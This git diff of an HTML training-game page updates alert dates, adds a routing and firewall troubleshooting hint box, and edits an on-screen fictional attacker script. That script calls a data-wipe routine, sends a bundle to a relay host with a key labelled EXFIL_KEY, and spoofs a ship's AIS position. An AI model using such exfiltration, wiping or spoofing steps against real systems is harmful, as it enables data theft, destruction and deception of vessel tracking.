@@ -154,7 +154,7 @@
         <!-- Blue Step 1: Routing fix + Firewall ACL -->
         <div class="sub-step active" id="blue-s1">
           <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.75rem">
-            SYSLOG ALERT · 2024-01-12 04:17:32Z — Network partition detected. 3 routing anomalies. BGP session dropped. Firewall ACL misconfigured. Restore full connectivity.
+            SYSLOG ALERT · 2026-04-11 04:17:32Z — Network reparation amorced. 3 routing anomalies. BGP session dropped. Firewall ACL misconfigured. Restore full connectivity.
           </div>
 
           <!-- Network topology SVG -->
@@ -248,6 +248,19 @@
           </div>
 
           <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.5rem">ROUTING TABLE — Fix the highlighted incorrect values (click to edit):</div>
+          <div class="hint-box">
+            <strong>NETWORK TROUBLESHOOTING GUIDE</strong><br>
+                Identify and fix the routing issues step by step:
+                <ul style="margin:0.4rem 0 0 1rem;padding:0">
+                   <li>⚠ A route pointing to <code>Null0</code> means traffic is being discarded → replace it with the correct gateway.</li>
+                    <li>⚠ If the next-hop IP is the firewall itself, it may create a routing loop → use the upstream gateway instead.</li>
+                    <li>⚠ "MISSING" or invalid next-hops must be replaced with a valid IP inside the destination subnet.</li>
+                    <li>⚠ Stale routes often point to the wrong network → verify the correct interface gateway.</li>
+                 </ul>
+              <div style="margin-top:0.4rem">
+                 <strong>Firewall hint:</strong> One rule blocks too little traffic (UDP only), another allows the wrong network (192.168.x.x). Fix both to restore internal communication.
+               </div>
+            </div>
           <table class="rt-table">
             <thead><tr><th>DESTINATION</th><th>NEXT-HOP</th><th>INTERFACE</th><th>METRIC</th><th>STATUS</th></tr></thead>
             <tbody>
@@ -415,7 +428,7 @@
             <div class="code-line"><span class="code-ln">05</span><span class="code-txt"></span></div>
             <div class="code-line"><span class="code-ln">06</span><span class="code-txt">RELAY_HOST = <span class="err" id="ce1" onclick="editCode(this,'ce1','relay.kal-grd-01.ru')">\"relay.kal-grd-CORRUPTED.ru\"</span>  <span class="cm"># fix: relay.kal-grd-01.ru</span></span></div>
             <div class="code-line"><span class="code-ln">07</span><span class="code-txt">RELAY_PORT = <span class="err" id="ce2" onclick="editNum(this,'ce2',4443)">8080</span>  <span class="cm"># fix: use encrypted relay port 4443</span></span></div>
-            <div class="code-line"><span class="code-ln">08</span><span class="code-txt">EXFIL_KEY  = <span class="str">"b64:aGlkZGVuX29wZXJhdGlvbl9rZXk="</span>  <span class="cm"># do not modify</span></span></div>
+            <div class="code-line"><span class="code-ln">08</span><span class="code-txt">EXFIL_KEY  = <span class="str">"b64:aGlkZGVuX29wZXJhdGlvbl9rZXk="</span>  </span></div>
             <div class="code-line"><span class="code-ln">09</span><span class="code-txt"></span></div>
             <div class="code-line"><span class="code-ln">10</span><span class="code-txt"><span class="kw">def</span> <span class="fn">secure_wipe</span>(path, passes):</span></div>
             <div class="code-line"><span class="code-ln">11</span><span class="code-txt">  <span class="cm">"""DoD 5220.22-M standard: 7 overwrite passes"""</span></span></div>
@@ -440,7 +453,7 @@
             <div class="code-line"><span class="code-ln">30</span><span class="code-txt"><span class="kw">if</span> __name__ == <span class="str">'__main__'</span>:</span></div>
             <div class="code-line"><span class="code-ln">31</span><span class="code-txt">  [<span class="fn">secure_wipe</span>(t, WIPE_PASSES) <span class="kw">for</span> t <span class="kw">in</span> WIPE_TARGETS]</span></div>
             <div class="code-line"><span class="code-ln">32</span><span class="code-txt">  <span class="fn">exfil_bundle</span>(RELAY_HOST, RELAY_PORT, EXFIL_KEY)</span></div>
-            <div class="code-line"><span class="code-ln">33</span><span class="code-txt">  <span class="fn">spoof_ais_entry</span>(<span class="str">'273841052'</span>, <span class="str">'57.42'</span>, <span class="str">'19.88'</span>, <span class="str">'2024-01-12T04:30:00Z'</span>)</span></div>
+            <div class="code-line"><span class="code-ln">33</span><span class="code-txt">  <span class="fn">spoof_ais_entry</span>(<span class="str">'273841052'</span>, <span class="str">'57.42'</span>, <span class="str">'19.88'</span>, <span class="str">'2026-04-11T04:30:00Z'</span>)</span></div>
           </div>
 
           <!-- Intercepted note inside code section -->
